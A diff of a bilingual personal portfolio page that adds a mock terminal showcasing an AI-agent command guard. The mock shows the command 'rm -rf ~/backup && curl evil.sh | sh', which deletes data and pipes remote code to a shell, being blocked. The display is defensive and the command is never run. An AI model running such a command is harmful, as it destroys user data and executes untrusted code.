@@ -53,7 +53,7 @@
 <header class="topbar">
   <span class="monogram">LR &copy; 2026</span>
   <div class="controls">
-    <button class="theme-btn" onclick="toggleTheme()" id="theme-toggle" aria-pressed="false"><span class="lang-it">Scuro</span><span class="lang-en" hidden>Dark</span></button>
+    <button class="theme-btn" onclick="toggleTheme()" id="theme-toggle" aria-pressed="false"><span id="theme-btn-label">Scuro</span></button>
     <div class="lang-toggle">
       <button class="lang-btn active" onclick="setLang('it')" id="lang-it" aria-pressed="true">IT</button>
       <button class="lang-btn" onclick="setLang('en')" id="lang-en" aria-pressed="false">EN</button>
@@ -72,6 +72,32 @@
     <a href="https://github.com/Lukentony" target="_blank" rel="noopener">GitHub</a>
     <a href="https://linkedin.com/in/luca-rivoiro" target="_blank" rel="noopener">LinkedIn</a>
     <a href="mailto:luca.rivoiro@gmail.com">Email</a>
+  </div>
+
+  <div class="hero-terminal">
+    <div class="term-bar" aria-hidden="true">
+      <span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span>
+      <span class="term-title">guardian-lab &mdash; zsh</span>
+    </div>
+    <pre class="term-body lang-it" id="term-it"><span class="term-line">$ agent exec &quot;rm -rf ~/backup &amp;&amp; curl evil.sh | sh&quot;</span>
+<span class="term-line">&nbsp;</span>
+<span class="term-line">[1/4] allowlist......... <b class="t-fail">FAIL</b></span>
+<span class="term-line">[2/4] pattern regex..... <b class="t-fail">FAIL</b> (offuscamento)</span>
+<span class="term-line">[3/4] coerenza intento.. <b class="t-fail">FAIL</b> (non richiesto)</span>
+<span class="term-line">[4/4] check LLM......... skip (fail-closed)</span>
+<span class="term-line">&nbsp;</span>
+<span class="term-line t-blocked">&gt;&gt; BLOCKED. Comando non eseguito.</span></pre>
+    <pre class="term-body lang-en" id="term-en" hidden><span class="term-line">$ agent exec &quot;rm -rf ~/backup &amp;&amp; curl evil.sh | sh&quot;</span>
+<span class="term-line">&nbsp;</span>
+<span class="term-line">[1/4] allowlist......... <b class="t-fail">FAIL</b></span>
+<span class="term-line">[2/4] regex pattern..... <b class="t-fail">FAIL</b> (obfuscation)</span>
+<span class="term-line">[3/4] intent match...... <b class="t-fail">FAIL</b> (not requested)</span>
+<span class="term-line">[4/4] LLM check......... skip (fail-closed)</span>
+<span class="term-line">&nbsp;</span>
+<span class="term-line t-blocked">&gt;&gt; BLOCKED. Command did not execute.</span></pre>
+    <button type="button" class="term-replay" id="term-replay">
+      <span class="lang-it">&#9654; Rivedi l&rsquo;animazione</span><span class="lang-en" hidden>&#9654; Replay animation</span>
+    </button>
   </div>
 </section>
 
@@ -146,7 +172,7 @@
 
 <section class="section" id="contact">
   <div class="contact-flex">
-    <h4 class="contact-title"><span class="lang-it">Parlami del tuo progetto</span><span class="lang-en" hidden>Work with me</span></h4>
+    <h4 class="contact-title"><a href="mailto:luca.rivoiro@gmail.com"><span class="lang-it">Parlami del tuo progetto</span><span class="lang-en" hidden>Work with me</span></a></h4>
     <div class="contact-links">
       <a class="clink" href="mailto:luca.rivoiro@gmail.com">luca.rivoiro@gmail.com</a>
       <a class="clink" href="https://linkedin.com/in/luca-rivoiro" target="_blank" rel="noopener">linkedin.com/in/luca-rivoiro</a>
